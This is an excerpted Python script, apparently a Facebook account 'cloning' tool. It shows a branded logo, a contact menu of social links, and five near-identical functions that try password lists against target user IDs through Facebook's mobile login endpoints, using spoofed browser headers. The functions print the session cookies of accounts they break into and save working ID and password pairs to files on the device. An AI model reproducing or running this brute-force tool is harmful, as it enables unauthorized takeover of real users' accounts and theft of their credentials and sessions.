...
#••••••••••••••••••••••••••••MY LOGO••••••••••••••••••••••••••••••#
logo =("""
\033[38;5;201m███    ███  \033[38;5;201m██████  \033[38;5;201m███    ██ \033[38;5;201m██ \033[38;5;201m██████      
\033[38;5;201m████  ████ \033[38;5;201m██    ██ \033[38;5;201m████   ██ \033[38;5;201m██ \033[38;5;201m██   ██     
\033[38;5;201m██ ████ ██ \033[38;5;201m██    ██ \033[38;5;201m██ ██  ██ \033[38;5;201m██ \033[38;5;201m██████      
\033[38;5;201m██  ██  ██ \033[38;5;201m██    ██ \033[38;5;201m██  ██ ██ \033[38;5;201m██ \033[38;5;201m██   ██     
\033[38;5;201m██      ██  \033[38;5;201m██████  \033[38;5;201m██   ████ \033[38;5;201m██ \033[38;5;201m██   ██  
...
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mMONIR HOSSAIN  \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-02\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mMONIR HOSSAIN      \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
def Contact():
	...
	if Tymin in ['1']:
		os.system('xdg-open https://www.facebook.com/copy.link.LD.MONIR.221')
	if Tymin in ['2']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=LD.MONIR.221')
	if Tymin in ['3']:
		os.system('xdg-open https://facebook.com/ID/LD.MONIR.221/')
	if Tymin in ['4']:
		os.system('xdg-open https://facebook.com/ID/LD.MONIR.221/')
	if Tymin in ['5']:
		os.system('xdg-open https://chat.whatsapp.com/🥰 সাধারণ_/\ ছেলে_/\মনির 🥰')
	if Tymin in ['6']:
		os.system('xdg-open wa.me/+8801886019617')
	if Tymin in ['7']:
		os.system('xdg-open t.me/MONIR KING')
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/MONIR-HOSSAIN221')
	if Tymin in ['9']:
		Nodi_Hasan()
	if Tymin in ['0']:
...
def Asraful1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mLD-M1\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfckfQzvPKzJnUMoRCRRgua0U0C_X2i3fpI1lHaPpA5LIunlJAUtjPQyZ-EcAydZeEUjKaUWABFDHzFYLCMGDO_b9gFit26l-srRvL9HCg9SlA&smuh=38879&lh=Ac9YTil_Jmy5s3ywE5c&wtsid=rdr_0JPo3bgMHwkF4nZqJ&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"AE9010"',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mMONIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/HASAN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[MONIR-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/MONIR-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mLD-M2\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mMONIR-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/HASAN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def Asraful3(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mLD-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mMONIR-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/HASAN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def Asraful4(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mLD-M4\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            ...
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://d.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mMONIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/MONIR-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def Asraful5(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mLD-M5\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mMONIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/MONIR-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
